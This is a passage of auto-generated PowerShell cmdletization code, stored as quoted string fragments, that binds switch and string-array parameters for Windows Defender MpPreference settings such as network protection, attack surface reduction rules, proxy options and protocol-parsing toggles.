'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableBlockAtFirstSeen')) {\r\n          [object]$__cmdletization_value = ${DisableBlockAtFirstSeen}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PUAProtection')) {\r\n          [object]$__cmdletization_value = ${PUAProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {\r\n          [object]$__cmdletization_value = ${CloudBlockLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {\r\n          [object]$__cmdletization_value = ${CloudExtendedTimeout}\r\n"
"          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {\r\n          [object]$__cmdletization_value = ${EnableNetworkProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {\r\n          [object]$__cmdletization_value = ${EnableControlledFolderAccess}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessAllowedApplications')) {\r\n          [object]$__cmdletization_value = ${ControlledFolderAccessAllowedApplications}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessAllowedApplications'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ControlledFolderAccessProtectedFolders')) {\r\n          [object]$__cmdletization_value = ${ControlledFolderAccessProtectedFolders}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ControlledFolderAccessProtectedFolders'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Ids')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Ids'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionRules_Actions')) {\r\n          [object]$__cmdletization_value = ${AttackSurfaceReductionRules_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionRules_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableLowCpuPriority')) {\r\n          [object]$__cmdletization_value = ${EnableLowCpuPriority}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableLowCpuPriority'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableFileHashComputation')) {\r\n          [object]$__cmdletization_value = ${EnableFileHashComputation}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFileHashComputation'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableFullScanOnBatteryPower')) {\r\n          [object]$__cmdletization_value = ${EnableFullScanOnBatteryPower}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableFullScanOnBatteryPower'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyPacUrl')) {\r\n          [object]$__cmdletization_value = ${ProxyPacUrl}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyPacUrl'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyServer')) {\r\n          [object]$__cmdletization_value = ${ProxyServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ProxyBypass')) {\r\n          [object]$__cmdletization_value = ${ProxyBypass}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ProxyBypass'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ForceUseProxyOnly')) {\r\n          [object]$__cmdletization_value = ${ForceUseProxyOnly}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ForceUseProxyOnly'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableTlsParsing')) {\r\n          [object]$__cmdletization_value = ${DisableTlsParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableTlsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n       "
" }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableFtpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableFtpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableFtpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableFtpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableHttpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableHttpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableHttpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDnsParsing')) {\r\n          [object]$__cmdletization_value = ${DisableDnsParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDnsOverTcpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableDnsOverTcpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDnsOverTcpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableSshParsing')) {\r\n          [object]$__cmdletization_value = ${DisableSshParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableSshParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PlatformUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${PlatformUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PlatformUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EngineUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${EngineUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EngineUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DefinitionUpdatesChannel')) {\r\n          [object]$__cmdletization_value = ${DefinitionUpdatesChannel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefinitionUpdatesChannel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableGradualRelease')) {\r\n          [object]$__cmdletization_value = ${DisableGradualRelease}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableGradualRelease'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionDownLevel')) {\r\n          [object]$__cmdletization_value = ${AllowNetworkProtectionDownLevel}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionDownLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowDatagramProcessingOnWinServer')) {\r\n          [object]$__cmdletization_value = ${AllowDatagramProcessingOnWinServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowDatagramProcessingOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableDnsSinkhole')) {\r\n          [object]$__cmdletization_value = ${EnableDnsSinkhole}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableDnsSinkhole'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableInboundConnectionFiltering')) {\r\n          [object]$__cmdletization_value = ${DisableInboundConnectionFiltering}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableInboundConnectionFiltering'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRdpParsing')) {\r\n          [object]$__cmdletization_value = ${DisableRdpParsing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRdpParsing'; ParameterType = 